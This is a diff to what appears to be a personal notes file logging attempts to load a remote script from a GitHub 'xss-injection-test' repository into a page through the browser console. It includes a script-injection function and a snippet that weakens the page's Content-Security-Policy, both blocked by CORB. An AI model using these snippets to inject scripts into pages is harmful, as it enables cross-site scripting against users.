@@ -41,7 +41,7 @@ https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js
 ```
 
 # First try (Brave)
-
+we execute in console:
 ```javascript
 function inject() {
     var script = document.createElement("script");
@@ -53,7 +53,26 @@ inject()
 ```
 
 ### Result:
-<span style="color: red">
+```
 VM304:6 Cross-Origin Read Blocking (CORB) blocked cross-origin response https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js with MIME type text/plain. See https://www.chromestatus.com/feature/5629709824032768 for more details.
-  </span>
+```
 
+## Second try. Add dinamically CSP
+We execute in console
+```
+function dynamicallyInsertCSP() {
+        let metaElement = document.createElement("meta");
+        metaElement.setAttribute("content", "default-src 'self' 'unsafe-inline' *.githubusercontent.com;")
+        metaElement.setAttribute("http-equiv", "Content-Security-Policy");
+        document.head.appendChild(metaElement);
+};
+
+dynamicallyInsertCSP();
+```
+
+And we check we have this tag at the HEAD:
+```
+<meta content="default-src 'self' 'unsafe-inline' *.githubusercontent.com;" http-equiv="Content-Security-Policy">
+```
+
+But when executing injection we get the same result
